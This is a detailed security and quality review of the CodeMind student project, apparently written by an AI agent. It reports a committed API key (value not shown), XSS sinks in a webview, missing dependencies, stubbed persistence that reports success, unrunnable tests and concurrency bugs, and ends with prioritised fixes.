# CodeMind — Full Codebase Review

**Reviewed:** `D:\HassanSem\Semester-6\FYP\CodeMind` (branch `phase1-part1-ppb`, HEAD `b65ef3487`)
**Scope:** whole repo — `codemindAgent/`, `claude-code/` delta, `vscodium/` base + patches, `scripts/`, `infra/`, `docs/`, planning docs
**Lenses, in priority order:** deep technical → architecture/design → FYP-facing (spec match)
**Mode:** report only, nothing changed. This file is the only thing added (untracked; delete freely).

**Severity:** CRITICAL = do today · HIGH = blocks a claim or breaks a build · MEDIUM = real defect · LOW = hygiene

---

## Coverage note (read this first)

The review was planned as ten parallel slice-audits. The model provider rate-limited
hard partway through, and six delegated slices failed out entirely (all three retries
each, HTTP 429): the browser/`.ts` layer, the webview UI, the build/patch audit, the
FYP spec-vs-code pass, the PPB persistence layer, and the tests audit. Rather than
report nothing, I covered those areas directly with my own tool calls. **Everything
below is first-hand verified** unless it says otherwise.

Areas that remain **not reviewed** are listed at the end. Do not read this report as
"the rest is clean".

---

## CRITICAL

### C1. A live OpenRouter API key is committed and publicly exposed

`vscodium/src/stable/src/vs/workbench/contrib/codemindAgent/browser/consensus/models.ts:107`

```ts
export const OPENROUTER_CONFIG = {
	baseUrl: 'https://openrouter.ai/api/v1',
	apiKey: '<a literal ~78-char key>',   // line 107
```

Evidence:
- It is in `HEAD`, not merely the working tree, and is the only tracked file with a key-shaped literal: `git grep -lE "sk-or-v1-[a-zA-Z0-9]{8,}"` → that file alone.
- Introduced by `80ba39ccf` "Implement LLM consensus UI with PBFT orchestrator" (and `9fe1ef37c`).
- `git branch -r --contains 80ba39ccf` → the commit is on **every** remote branch: `origin/main`, `origin/feature/aristotle-pet`, `origin/feature/consensus-relevance-and-voice`, `origin/part2-ingestion-delivery`, `origin/Phase-3_LLM-Consensus`.
- `https://github.com/iam-hassan/CodeMind` returns HTTP 200 unauthenticated → the repo is public.
- `openRouterService.ts:40` makes it the module default (`let openRouterApiKey = OPENROUTER_CONFIG.apiKey`), so the consensus feature runs on it out of the box — anyone who clones and enables consensus spends your credits.
- **There is no override path.** `setOpenRouterApiKey()` is defined at `openRouterService.ts:42` and **called nowhere in the tree** (`grep -ran` → definition only), and every request sends it: `:66` `'Authorization': \`Bearer ${openRouterApiKey}\``. So the committed key is not merely a default — it is the only key any consensus call ever uses. Being under `browser/`, it is also bundled into the shipped renderer.

This contradicts `README.md:36`: *"the key is entered in the panel and kept in the editor's own secret storage — nothing writes it into this repository or into the workspace."*

**Action:** rotate the key at OpenRouter now. Deleting line 107 is not sufficient — it remains in history on five pushed branches. If the repo must stay public, history needs rewriting (BFG/filter-repo) *and* the key rotated regardless. The file's header comment says it was ported from `LLM_consensus/LLM-Consensus/backend/src/config/models.ts` — check that repo for the same key and rotate it there too.

---

## HIGH

### H1. XSS in the consensus webview — two sinks, model output reaching `innerHTML`

No escaping on either. Model output is attacker-influenceable (a hostile/compromised OpenRouter model, or prompt-injected file content echoed into a critique).

**Sink 1** — `browser/media/consensus.js:289-291`:
```js
const content = `<strong>${senderName}</strong> <span ...>to ${targetName}</span><br/>${critique.critique || critique.feedback || ''}`;
appendEvent(content, false, true, 'critique-bubble');
```
`appendEvent`'s third arg is `isHtml`, and its `isHtml` branch is `el.innerHTML = timeEl + message` (line 193) with no escaping. `senderName`/`targetName` are model display names; `critique.critique` is raw model text.

**Sink 2** — `consensus.js:309-318`: `els.finalAnswer.innerHTML` interpolates `text` (`finalAnswer`) and `reason` (`finalReasoning`) directly; line 306/307 only convert `\n` to `<br/>`, never escape.

The webview holds `acquireVsCodeApi()`, so injected script can `postMessage` into the extension host.

**Fix:** route both through the file's own `escapeHtml` (defined at `consensus.js:19`, correct, and already used elsewhere) — or drop the `isHtml` escape hatch entirely.

### H2. No CSP and no nonce on any of the three webviews

`grep -ran "Content-Security-Policy|cspSource|nonce|http-equiv"` over the whole `codemindAgent/` tree returns **nothing** (run with `-a`; see N1). All three set webview HTML with script tags and no policy:

- `browser/codeMindAgentViewPane.ts:999-1003` — five `<script src=...>` tags, no nonce
- `browser/codeMindConsensusPanel.ts:363` — `<script src=...>`, no nonce
- `browser/codeMindOrchestrationTracePanel.ts:217` — same

Nothing mitigates H1. VS Code's own guidance is a nonce-based `script-src ${webview.cspSource}` meta tag.

**Fix:** add a per-load nonce and a CSP meta tag to all three HTML builders.

### H3. The PPB layer cannot build from a fresh clone

`pg@^8.23.0`, `@types/pg@^8.23.1`, `neo4j-driver@^6.2.0` and `ioredis@^6.0.0` exist **only** as hand-edits in the gitignored `vscodium/vscode/package.json` (`git -C vscodium/vscode diff --stat -- package.json` → +10/−14, with those as added lines: `@types/pg` at :101, `ioredis` at :136, `neo4j-driver` at :142, `pg` at :146).

Neither `grep -rln "neo4j-driver\|@types/pg\|\"pg\":" vscodium/patches/` nor `grep -rln "ioredis" vscodium/patches/` matches anything (exit 1). No patch and no file in the `vscodium/src/stable` overlay adds them; the CodeMind patch that touches `package.json` only rewrites a Copilot engines check in `build/npm/postinstall.ts`.

**The mechanism, corrected** (the build/vendoring slice forced a fix to this paragraph): `scripts/setup.sh` *does* install all four — but only in an **uncommitted local edit**. The working tree carries a +8-line block that committed `HEAD` does not (`git show HEAD:scripts/setup.sh` → no match for `npm install` / `neo4j-driver` / `ioredis` / `@types/pg`):

```sh
step "PPB database clients (pg, neo4j-driver, ioredis)"
if [ ! -d "${CODIUM}/vscode/node_modules/@types/pg" ]; then
  ( set +u; cd "${CODIUM}/vscode" && npm install --save --no-audit --no-fund pg @types/pg neo4j-driver ioredis ) \
    ||die "installing the PPB database clients failed (output above)."
else
  note "already installed"
fi
```

So the deps arrive on this machine and on no other: a fresh clone runs the committed `setup.sh`, which never installs them, and `node/ppb/storage/pg.ts` (`import { Client } from 'pg'`) and `neo4j.ts` (`import neo4j from 'neo4j-driver'`) fail to compile — taking the whole workbench build with them. (`ioredis` is declared but unused; see N9.) Two further smells in that block: `npm install --save` **mutates** the gitignored checkout's `package.json` and `package-lock.json` at build time, which no patch or overlay owns or reverses; and the `-d node_modules/@types/pg` guard means a partially-populated `node_modules` skips the install entirely. `||die` is also missing its space (harmless, but inconsistent with `|| die` elsewhere in the file).

**Fix:** add the dependency additions to `vscodium/patches/00-codemind-build-hygiene.patch` (the mechanism that already exists for exactly this).

### H4. The `ProjectBrain` tool reports success while discarding data

`claude-code/src/tools/ProjectBrainTool/ProjectBrainTool.ts:16-20`:
```ts
export class NoopSegmentSink implements ISegmentSink {
	async ingest(segments: any[]): Promise<void> {
		// Drop segments intentionally.
	}
}
```
`ProjectBrainLogic.ts:33-47`: `store` → `sink.ingest([...])` → returns `'Stored successfully.'`. So `store` always reports success and stores nothing; `recall` goes through `NullRetriever` and always returns `'No results found.'`.

The tool is offered to the model whenever `CODEMIND_PPB_ENABLED === '1'` (`ProjectBrainTool.ts:44`). `bootstrapPPB()` (`claude-code/src/bootstrap/ppb.ts`) would install these same no-ops but is **never called** anywhere — so the no-op is *always* in effect. An agent will confidently tell the user it saved project knowledge.

**Fix, pick one and be explicit:** keep the tool disabled until a real sink exists (`isEnabled: () => false` or drop it from `getAllBaseTools()`), or make `store` return an honest failure/not-implemented result.

### H5. The wired PPB ingest path persists nothing, and the storage layer is test-only

- `node/ppb/sink.ts:34-45` — `PpbSegmentSink.ingest()` calls the extractor and only logs: `this._log(\`ppb: turn ${segment.turnId} -> ${result.facts.length} fact(s)\`)`. It never touches storage. `scheduleBackfill()` (47-53) only logs.
- `node/ppb/extraction/stubExtractor.ts:18-20` — `extract()` always returns `{ segmentId: segment.turnId, facts: [] }`. So the log line always reads `0 fact(s)`.
- `node/codeMindAgentEngineMain.ts:728-730` registers it: `if (isPpbEnabled()) { ... setSink(new PpbSegmentSink()); }`, so with `CODEMIND_PPB_ENABLED=1` every turn runs the pipeline and persists zero facts.
- Excluding its own tests, **nothing imports the storage layer**: `graphRepo.ts` (488 lines), `pg.ts`, `neo4j.ts`, `migrations/*`, `applyPpbMigrations` have no callers in the app. Only `config.ts` and `sink.ts` are wired into the engine.

So today: migrations, the Neo4j repository and both DB clients are test-only code reachable from no running code path.

### H6. The test suite cannot currently run, and nothing runs it

- `vscodium/vscode/out/` is **absent** — the workbench is not compiled, so these tests cannot execute. The runner is `npm run test-node` = `mocha test/unit/node/index.js --delay --ui=tdd --timeout=5000 --exit`, and its glob is `**/test/**/*.test.js` **under `out/`** — i.e. the tests only ever run as compiled JavaScript, and there is no `out/` tree at all, so there is no partial or alternative way to run them today. A full `scripts/setup.sh --compile` is required first.
- No CI workflow references them: the only workflows are VSCodium's own (`vscodium/.github/workflows/ci-build-*`, `publish-*`, `mod-*`); `grep -riln "codemind\|ppb" vscodium/.github/` → **nothing**.
- The suite is not trivial (25 files): ~350 tests, ~750 assertions, 8 skips. That volume of unexecuted, unautomated test code is a claim with no evidence behind it.

**Fix:** add a workflow that compiles and runs the unit tests (the integration ones below can stay opt-in), or state plainly in the README that tests are currently unverified.

---

## MEDIUM

### M1. Integration tests silently skip; the real DB paths are opt-in only

`node/test/ppb/integration/graphRepo.integration.test.ts:19,32` and `stack.integration.test.ts:21,28`:
```ts
const enabled = process.env.PPB_TEST_INFRA === '1';
...
if (!enabled) { this.skip(); }
```
5 of the suite's 8 skips are these. In any normal run they pass by not running, so Postgres/Neo4j/pgvector behaviour is verified only when someone remembers to export a variable *and* has the stack up. `docs/ppb/schema.md:136` asserts "Verified live against the Route A Neo4j (12 tests)" — unverifiable from the repo (no logs), and the count is 12 tests of which 1 skips.

### M2. The consensus "similarity" is lexical, and non-Latin text collapses to zero

`browser/consensus/consensusEngine.ts:19-52` — `cosineSimilarity` is bag-of-words term frequency:
```ts
.toLowerCase().replace(/[^a-z0-9\s]/g, '').split(/\s+/).filter(w => w.length > 2)
```
It computes a genuine cosine over those vectors and does guard zero norms (`if (normA === 0 || normB === 0) return 0;`, line 50), so no NaN. But stripping everything outside `[a-z0-9]` means any answer in Urdu, Arabic, Chinese or Cyrillic tokenises to an empty vector → similarity 0 for every pair. Consequences: models answering in a non-Latin script look maximally divergent, consensus is unreachable, and hallucination/divergence scoring misreports.

`implementation_plan.md:168` describes this as "Cosine similarity algorithm for text divergence" — technically true, but a marker asking "where are the embeddings?" will find bag-of-words. Either say so in the docs or use the BGE-M3 embeddings the PPB layer already plans for.

### M3. `segmentQueue` drains are not serialised

`node/orchestration/segmentQueue.ts` — `scheduleDrain()` (205-216) sets `_drainScheduled = true`; `drain()` clears it at entry (line 180) and then `await _sink.ingest(batch)` (line 187). An `enqueue()` landing during that await sees `_drainScheduled === false`, sets it true and queues a second `setImmediate` drain, which can begin `await _sink.ingest(...)` before the first drain resumes → two concurrent `ingest()` calls over two batches, contradicting the file's own invariant (lines 9-14, "single ordered handoff"). Harmless against today's stub sink; a real DB sink would interleave writes.

Also `flush()` (222-226) awaits only the first drain's promise, which whichever drain finishes first nulls — so `flush()` can return with a batch still in flight. And `_stats.dropped` is incremented both before queueing and on sink failure (line 193), contradicting the field's doc comment (line 88).

### M4. Project registry: shared tmp path, non-atomic fallback, silent reset, dead version field

`node/orchestration/projectRegistry.ts`:
- `registryTmp()` (line 59) returns a **fixed** `projects.json.tmp`. Two concurrent writers (two windows, same project) write the same tmp then rename, racing → interleaved/truncated content.
- `persist()` (190-212) writes tmp then renames, but the rename `catch` (208-211) falls back to `await writeFile(registryFile(), json)` — a truncating, non-atomic overwrite. The fallback path is precisely the one that can corrupt the file on a crash mid-write, and it swallows the original error.
- `load()` (159-188) catches any parse failure and starts from defaults with no log, no backup and no quarantine; the next `persist()` then overwrites the unreadable file. A corrupt registry loses every project identity and preference silently.
- `CURRENT_VERSION` is defined (43) and written (197) but **never read or compared** — the version field is decorative, there is no upgrade path.

### M5. Dev stack exposes databases on all interfaces with weak default credentials

`infra/ppb/docker-compose.yml`:
- `POSTGRES_PASSWORD: postgres` (line 23), `NEO4J_AUTH: neo4j/codemindppb` (line 39) — committed default credentials, matching `node/ppb/config.ts:41,44`. Fine for localhost-only dev, but see next point.
- Ports use `"${PPB_PG_PORT:-55432}:5432"` (26), `"...:7687"` (42), `"...:6379"` (55) with no host IP, so Docker publishes on `0.0.0.0` — Postgres, Neo4j and Redis with those passwords are reachable from the LAN. Note `infra/ppb/docker-compose.yml:13` even tells the user to put the same credentials in an env var.
- Images are version-tagged (`pgvector/pgvector:pg17`, `neo4j:5-community`, `redis:7-alpine`) but not digest-pinned; `neo4j:5-community` will drift within major 5.
- Healthchecks are present for all three (good); no resource limits.

**Fix:** prefix each port mapping with `127.0.0.1:`.

### M6. `scripts/setup.sh` does not abort on failure and verifies no downloads

- Line 27: `set -u -o pipefail` — **no `set -e`**. A failing step does not stop the script, so a mid-way failure leaves a half-patched, half-built tree; the README tells users to expect an hour and several GB, which makes a confusing partial state likely.
- `grep -n "sha256\|shasum\|checksum\|--verify" scripts/setup.sh` → nothing. Downloads (VS Code checkout, Electron runtime) are not integrity-checked.
- Line 248: `( cd "${CODIUM}" && cp -rp src/stable/* vscode/ )` — unquoted glob; `*` also skips dotfiles in the overlay.

---

## LOW / hygiene

**N1. Two CodeMind source files contain literal NUL (`U+0000`) bytes**, so `grep`, `ripgrep`, `git diff` and most CI scanners treat them as **binary and skip their contents**. A full byte scan of the contrib tree shows exactly two text files affected (the `.png` sprite strips report NULs too, which is expected for image data):

| NULs | File | Where / why |
|---|---|---|
| 5 | `browser/media/agent.js` | the sentinel markers in `renderMarkdown` (lines 4086, 4132, 4137), intended as `\u0000` escapes — line 4095 uses `\u0001` the same way |
| 1 | `browser/codeMindAgentViewPane.ts:1370` | `const key = \`${providerId}\x00${model}\`;` — a raw NUL as a delimiter in a dedupe key (`cat -v` renders it `^@`) |

Both are deliberate choices (an unambiguous delimiter/sentinel) that work at runtime, but writing the raw control byte instead of `\u0000` makes the file invisible to code search. This misled my own first pass on `agent.js` — I briefly concluded `renderMarkdown` was undefined — until I switched to `grep -a`. Use the escape sequence, not the byte.

**N2. Duplicate `case` label** — `browser/media/consensus.js:324-325`: `case 'consensus_blocked':` twice in a row; the second is unreachable.

**N3. Two different `ISegmentSink` interfaces** with different shapes: `node/orchestration/segmentQueue.ts:75` and `claude-code/src/tools/ProjectBrainTool/ProjectBrainLogic.ts:13`. Two independent `setSink` registries; the Claude Code one is never given a real sink (H4).

**N4. `ProjectBrain` advertises an unimplemented operation** — `ProjectBrainTool.ts:35` accepts `z.enum(['recall','store','list'])`; `ProjectBrainLogic.ts:49-51` returns `"List operation not yet implemented."`

**N5. Project identity via a process-global env var** — `ProjectBrainTool.ts:46` reads `process.env.CODEMIND_CURRENT_PROJECT_ID`. In a long-lived utility process serving multiple windows, last writer wins; tool calls are not scoped to a session (cross-project bleed).

**N6. MIT headers reference a file that doesn't exist** — every PPB source file says "Licensed under the MIT License. See License.txt in the project root", and there is **no `LICENSE` or `License.txt`** at the repo root (`ls -a | grep -i licen` → nothing). `README.md:187-196` says no licence has been chosen. `claude-code/` has no LICENSE/COPYING/NOTICE either and no recorded upstream pin, so vendor drift is unmeasurable.

**N7. CDP verification harness doesn't exist in the repo** — `/verify/` is gitignored (`.gitignore`) and absent from the working tree. `README.md:161-167` claims "81 checks (T-000 through T-156...) driven against a live build over the Chrome DevTools protocol" plus a theme-contrast sweep. Unverifiable from the repo — no harness, no logs, no report artifact. I hand-verified three of its claims instead: the panel does emit the escapes it claims (see P1), `localResourceRoots` is correctly scoped (P2), and the theme claim is **not** fully true — hardcoded colours exist in the media files (`agent.js` uses `opacity`/`font-size` inline styles, e.g. line 289 of consensus.js; a full sweep wasn't completed here).

**N8. `test.md` (156 lines) is a duplicate project summary** — it restates `README.md`'s overview and layout. Committed at root with a misleading name; a marker will open it expecting tests.

**N9. Redis is aspirational** — `docs/ppb/schema.md:81` says "Part 1 implements read/write from the retrieval path". `redisUrl` appears **only** in `node/ppb/config.ts:22,45`; there is no Redis client anywhere in the codebase. `infra/ppb/docker-compose.yml:51-62` runs a Redis that nothing connects to.

**N10. `docs/ppb/schema.md` is otherwise accurate** — I checked it against `001_init.ts`, `002_embeddings.ts`, `003_seed_meta.ts` and `migrate.ts` line by line: table list, the 6 memory categories, the 1024-dim placeholder, the deliberately-deferred vector index, the polymorphic no-FK columns, the per-migration transactions and the extension-left-in-place rollback note all match the code, and placeholders are honestly labelled. Only §6 (Redis, N9) and the "12 tests verified live" count (M1) overstate.

---

## What is genuinely good

Worth saying, because a lot of this codebase is careful:

**P1. `agent.js`'s escaping and markdown pipeline is correct.** `escapeHtml` (4626-4634) covers all five characters; `escapeAttr` delegates to it (4636-4638). `renderMarkdown` escapes first (line 4082) and only then injects its own tags. `highlightCode` (4277-4294) does the unescape→re-tokenise→**re-escape every emitted piece** round trip, which is exactly right, and bails out safely for large blocks or unknown languages. `unescapeHtml` (4296-4303) orders `&amp;` last, which is the correct inverse. `SAFE_LINK_SCHEME` (line 64) allows only `https?://` and `mailto:`, so `javascript:` links are dead. The H1 XSS is confined to `consensus.js`, which came from a different codebase — the main panel is well built.

**P2. Webview resource scoping is right** — all three panels set `localResourceRoots` to the media directory only, and the engine keeps the API key out of the webview (`codeMindConsensusPanel.ts:167`: "Only identity and labels cross to the webview. `apiKey`/`baseUrl` stay in this [process]"), with `PublicModelInfo` (`browser/consensus/models.ts:25-33`) as the deliberate public projection. That design is sound — it's the committed default key (C1) that breaks it.

**P3. `segmentQueue.ts` is well-constructed** apart from M3: bounded 256-segment ring evicting the *oldest* so recent context survives, `enqueue()` genuinely never throws, `projectId`/`ppbEnabled`/PII/`shouldIngest` guards before queueing, no timers, no leaked listeners, test-only reset helpers clearly marked.

**P4. Migrations are transactional and idempotent** — `migrate.ts:60-69` wraps each migration and its ledger insert in one `BEGIN`/`COMMIT` with `ROLLBACK` on error, so a partial failure leaves no half-applied version; every migration carries a `down` (validated by `migrations.test.ts`'s applied/skipped assertions); `003` is idempotent via `ON CONFLICT DO NOTHING`.

**P5. `projectIdentity` is a genuinely good design** — UUIDv5 over a normalised git remote URL with first-commit hash as the fallback signal, so identity survives renames, moves and re-clones (documented at `projectIdentity.ts:12-13`). Deterministic, not random, and hashing is not used for any security decision.

---

## Architecture assessment

The five-layer split (contribution → view pane → shared protocol → sandbox proxy → utility-process engine) is the right shape: a hung turn or crashed SDK can't take the window with it, and the API key never reaches the renderer or disk. `ProxyChannel` over `IUtilityProcessWorkerWorkbenchService` is the idiomatic mechanism. The PPB work follows it cleanly — a `node/ppb/` subtree with an injected query interface so storage is unit-testable, `ISegmentSink` as the seam between Part 2's queue and Part 1's persistence.

The problems are at the seams, not in the shape:

1. **The seam is stubbed on both sides and the docs read as if it isn't.** Part 2's queue hands segments to a sink that logs them; Part 1's tool hands content to a sink that drops it. Neither writes anything, and `sink.ts:17-18` calls itself "The real PPB ingestion sink". That is the single biggest gap between the written plan and the running system.
2. **Two global sink registries** (N3) and a bootstrap that installs no-ops (never called) mean there is no single owner of "what persists a segment".
3. **Test-only storage** (H5) — a 488-line Neo4j repository, three migrations and two DB clients with no production caller. Either wire them or don't claim them.
4. **Vendoring a 513k-LOC CLI to add one 112-line tool** (H4) carries a real upgrade cost: `claude-code/` has no recorded upstream pin, so re-syncing with upstream Claude Code means a hand merge, and `tools.ts` has now been edited in two places.

---

## FYP-facing summary

Against the written plan, the honest position today:

| Claim | Reality |
|---|---|
| Part 2 ingests conversation segments | Segments reach a sink that logs a count and persists nothing (H5) |
| Part 1 persists to Postgres/Neo4j | Storage layer has no production caller; migrations and graph repo are test-only (H5) |
| `ProjectBrain` tool recalls/stores project knowledge | Always returns "No results found." / "Stored successfully." while storing nothing (H4) |
| Multi-LLM consensus with cosine similarity and hallucination scoring | Lexical bag-of-words, zero for any non-Latin script (M2) |
| Verification: 81 CDP checks, all but three passing | Harness absent and gitignored; unverifiable from the repo (N7) |
| Neo4j "verified live (12 tests)" | Tests skip unless `PPB_TEST_INFRA=1`; 1 of the 12 skips (M1) |
| Redis caching (schema.md §6) | No Redis client exists (N9) |
| Tests exist for the PPB layer | ~350 tests that cannot run (`out/` absent) and no CI runs them (H6) |
| "nothing writes [the key] into this repository" | A live key is committed and public (C1) |

The two things a marker is most likely to probe — "show me it storing something" and "show me the tests passing" — currently have no answer in the repo. Both are fixable: H4/H5 by wiring one real path end to end, H6 by compiling and running the suite.

---

## Prioritised actions

1. **Rotate the OpenRouter key** (C1). Today. Then remove line 107 and read it from secret storage / env.
2. **Add the three deps to `00-codemind-build-hygiene.patch`** (H3) so a fresh setup builds.
3. **Disable `ProjectBrain` or make it honest** (H4) — `isEnabled: () => false` is a one-line stopgap.
4. **Escape the two `consensus.js` sinks and add CSP+nonce to all three webviews** (H1, H2).
5. **Compile and run the test suite once; add a CI workflow** (H6).
6. **Wire the sink to real storage** (H5) — or relabel `PpbSegmentSink` as a stub and mark the phase accordingly.
7. Fix the registry tmp race and non-atomic fallback (M4); serialise queue drains (M3); bind dev DB ports to `127.0.0.1` (M5); add `set -e` to `setup.sh` (M6).
8. Hygiene: NUL bytes in `agent.js` (N1), duplicate `case` (N2), delete `test.md` (N8), add a LICENSE or fix the MIT headers (N6).

---

## Appendix A — PPB persistence layer: delegated deep-dive, merged

One delegated slice did complete (the PPB persistence review). It independently confirmed
H5 and the migration analysis above, and added the following. I re-verified every item
marked ✓ against the source myself; item A13 is a claim of its own that I checked and
**rejected**.

### Additional MEDIUM

**M7. ✓ `mergeNode`'s MERGE key contradicts the uniqueness constraint.**
`graph/graphRepo.ts:156`:
```cypher
MERGE (n:`${nodeType}` {id: $id, projectId: $projectId})
```
matches on `id` **+** `projectId`, but `ontology.ts:107` creates
`CREATE CONSTRAINT <type>_id_unique ... REQUIRE n.id IS UNIQUE` — on `id` alone, per label.
The same id under a different `projectId` therefore does not match the existing node, so
MERGE attempts a CREATE and hits the constraint, surfacing as a generic `driver-failure`
(the constraint violation is only special-cased for `duplicate-node` in `createNode`,
`graphRepo.ts:142-143`). Only works today because ids happen to be UUIDs.

**M8. ✓ `createRelationship` is unlabelled and non-idempotent.**
`graph/graphRepo.ts:205-208`:
```cypher
MATCH (a {id: $fromId, projectId: $projectId}), (b {id: $toId, projectId: $projectId})
CREATE (a)-[r:`${relationshipType}`]->(b)
```
No label on either endpoint. Because uniqueness is per-label (`ontology.ts:107` loops all
8 types), the same id can legitimately exist under two labels, so this MATCH can bind
several nodes per side — a Cartesian product of relationships. And it is `CREATE`, not
`MERGE`, so re-ingesting the same segment duplicates every relationship. This directly
undercuts §6.9's "idempotent create-or-update" claim for edges.

**M9. ✓ `rollbackMigrations({toVersion})` reverts everything if the target isn't applied.**
`storage/migrate.ts:85-91`: the loop `break`s only when `migration.version === options.toVersion`.
A typo or a version that was never applied means the `break` never fires, so **every**
applied migration is reverted — a one-character mistake drops the whole schema. Compare
`runMigrations`, which is safe.

**M10. ✓ No pg client `'error'` listener and no statement timeout.**
`storage/pg.ts:19-22`: `CONNECTION_TIMEOUT_MS = 5_000` is passed as `connectionTimeoutMillis`
only. The comment at `pg.ts:18` says "a missing database degrades fast" — true only for
*connect*; a wedged query has no `statement_timeout`/`query_timeout` and hangs the caller
forever. A `pg.Client`'s `'error'` event with no handler throws an uncaught exception in the
engine worker (mitigated today only because clients are short-lived). Also `connect()` sits
outside the `try` (`pg.ts:28` vs `:29`), so a throw there skips `end()`.

**M11. ✓ Embedding dimension and model have no single source of truth.**
`vector(1024)` at `storage/migrations/002_embeddings.ts:25`, `('embedding_dim','1024')` at
`003_seed_meta.ts:27`, and 1024 in `docs/ppb/schema.md` §4 — with **no** embedding-dimension
field in `config.ts` and no shared constant, so nothing at runtime can validate a vector's
length. Same shape for the model: `config.ts:47` `embedModel ?? 'bge-m3'` vs the seeded
`003_seed_meta.ts:26` `('embedding_model','bge-m3')` — overriding `PPB_EMBED_MODEL` leaves
`ppb_meta` stating something false. (Consistent with the N9-style doc drift.)

**M12. ✓ No dedupe key for real facts.** `001_init.ts:26-42`: `memories.id UUID PRIMARY KEY`
with no content hash and no natural key, and no `ON CONFLICT` in the layer. Re-ingesting the
same fact mints a new row. Latent today because there is no write path (H5).

### Additional LOW

**A1. ✓ `memory_versions.from_status`/`to_status` carry no CHECK** (`001_init.ts:101-102`),
so the audit table can hold states outside `MEMORY_VERSION_STATES` (`ontology.ts:80`) —
unlike every other vocabulary column, which is checked.
**A2. `NODE_MINIMUM_PROPERTIES`** (`ontology.ts:58-67`) is declared and never enforced;
`createNode`/`mergeNode` accept any property bag, while `schema.md` §1.3 implies enforcement.
**A3. `SHARED_MEMORY_METADATA`** (`ontology.ts:70-77`) is exported and consumed only by its own test.
**A4. ✓ `applyGraphConstraints` is never called at startup** — only from the integration
tests — so a fresh install has **no** Neo4j uniqueness constraints or project indexes; a
duplicate node is accepted silently until someone runs the tests. Nothing calls
`driver.close()` outside those tests, and there is no `verifyConnectivity()`.
**A5.** Neo4j sessions use the default (WRITE) access mode even for `getNode`/`findNodes`/`history`.
**A6. ✓ `_run` re-wraps every error as `PpbGraphError('driver-failure')`, dropping `cause`/stack**
(`graphRepo.ts:389-400`), so auth vs timeout vs Cypher syntax is indistinguishable.
**A7.** No schema qualification / `search_path` pin: `schema_migrations`, `projects`,
`embeddings` are bare identifiers and each `withPgClient` gets the server default, so
`CREATE TABLE IF NOT EXISTS` and the ledger SELECT can in principle land in different schemas.
**A8. ✓ Cross-store naming split** (unwritten): graph `date`/`occurredAt`/`type` vs relational
`decided_at`/`occurred_at`/`event_type`; `SHARED_MEMORY_METADATA.extractedAt` vs `extracted_at`.
**A9.** `CONNECTION_TIMEOUT_MS` duplicated in `pg.ts:19` and `neo4j.ts:19`.
**A10.** Unbounded traversal breadth: `graphRepo.ts:329,354` cap hops but carry no result `LIMIT`.

### A13. REJECTED claim — the default PG URL is fine

The slice reported as a **"definite bug"** that `config.ts:41` contains a literal `***`
password, making the default URL unable to authenticate against the documented stack.
**That is a tooling artifact, not a finding.** Hermes redacts secret-shaped values in tool
output, so the URL renders as `postgres://postgres:***@localhost:55432/...` to *any* reader.
Reading the file's bytes directly (`python`, printing shape only) shows the password is the
same dev value `infra/ppb/docker-compose.yml:23` sets, so **config and compose are
consistent** — no bug. Treat this as a methodological caution: on this codebase, both a
password **and** a genuine leak (C1) appear as `***` in tool output, so neither a
present-looking nor an absent-looking secret can be judged from a rendered read.

*Note: C1 was established by pattern-matching and commit/branch analysis, not by reading the
key's value — which is why it holds despite the redaction.*

### Verified sound (independently confirmed)

Migration atomicity and rollback-on-error with the ledger row inside the same transaction;
parameterised SQL throughout (`$1`/`$n`) with no interpolated identifiers; sessions and
clients closed in `finally`; migration and seed idempotency; graph node/relationship types
and hop counts whitelisted and integer-validated *before* interpolation; ontology vocabularies
matching the CHECK constraints; ports, db name and dev credentials consistent between
`config.ts` and `docker-compose.yml`; `Vector` index absence is intentional and documented, so
no operator-class/distance-operator mismatch is possible today (grep for `<=>`, `<->`, `<#>`,
`USING hnsw|ivfflat` → zero hits repo-wide).

---

## Appendix B — Engine + IPC boundary: delegated deep-dive, merged

The engine/IPC slice also completed (18 tool calls, ~7 min), covering
`node/codeMindAgentEngineMain.ts` (3513 lines), `node/codeMindOrchestrationEngine.ts`,
`common/codeMindAgentEngineService.ts` and `electron-sandbox/codeMindAgentEngineService.ts` —
so those four files are now reviewed, not outstanding. It independently confirmed C1 and
adds the following. Every ✓ item below I re-verified against the source myself.

### Strengthens C1

**C1a. ✓ No override path for the OpenRouter key** — see the second bullet added under C1 above.

### Additional HIGH

**H7. ✓ A crashed engine worker is never detected — calls dangle forever.**
`electron-sandbox/codeMindAgentEngineService.ts:144-158` caches the creation promise and
clears it only when *spawn* rejects. There is no exit listener anywhere
(`grep -an "onExit\|onDidExit\|onDidClose\|'exit'\|onUnexpected"` over both engine files →
nothing). A worker that starts and then dies (OOM, crash mid-turn, SDK import failure after
the client has been handed out) leaves `_workerPromise` resolved to a dead client:
subsequent IPC goes nowhere and the returned promise never settles, with no renderer-side
timeout and no respawn.
*Caveat, from the slice and endorsed:* VS Code's `IUtilityProcessWorkerWorkbenchService` is
absent from `vscodium/src/stable`, so this is verified from the consumer side only — whether
the utility-process host surfaces the exit was not inspectable in this checkout.

**H8. ✓ `cancelQuery` denies *every* pending permission, not just the cancelled turn's.**
`node/codeMindAgentEngineMain.ts:1645-1648` iterates the whole `_pendingPermissions` map,
which is keyed by `toolUseId`, so no `queryId` filter is even available:
```ts
// Deny any permission prompt still waiting on this query.
for (const [toolUseId, pendingPermission] of [...this._pendingPermissions]) {
	this._pendingPermissions.delete(toolUseId);
	pendingPermission.resolve({ behavior: 'deny', message: 'Request cancelled.', interrupt: true });
}
```
The comment says "on this query"; the code denies all of them. Concurrent turns are expected
(the engine supports a companion/`/btw` turn alongside the visible one), so cancelling one
turn silently denies the other's permission prompt.

**H9. ✓ A per-turn `AbortController` leaks on every successful turn.**
`_aborts` is set at `:1096` and deleted only on the rejection path (`:1200`) and in
`cancelQuery` (`:1636`) — **never in `_finalize`**. Each completed turn therefore retains its
`AbortController` and signal for the worker's entire lifetime: unbounded growth in a
long-lived utility process. (`_headroomTurns`/`_traceCollectors` have the same
cancel/no-result gap but are bounded by size-32 eviction on insert.)

### Additional MEDIUM

**M13. ✓ Child processes inherit the worker's environment, key included.**
`node/codeMindAgentEngineMain.ts:2223` — `_spawnCapture` passes `env: process.env` to every
`exec`/`execShell` child, so `git`, `gh` and a user's `!` shell command inherit any
`ANTHROPIC_API_KEY` present in the worker environment. The engine also treats
`process.env.ANTHROPIC_API_KEY` as a genuine key source (`:2636`).

**M14. ✓ A turn that ends without a `result` message is reported as success.**
`:1588-1597` resolves `text: cur.text || 'No response.'` with **`isError: false`** (line 1593,
verified by direct read). A turn that produced nothing is indistinguishable from a genuinely
empty answer, so the renderer cannot tell the user anything went wrong.

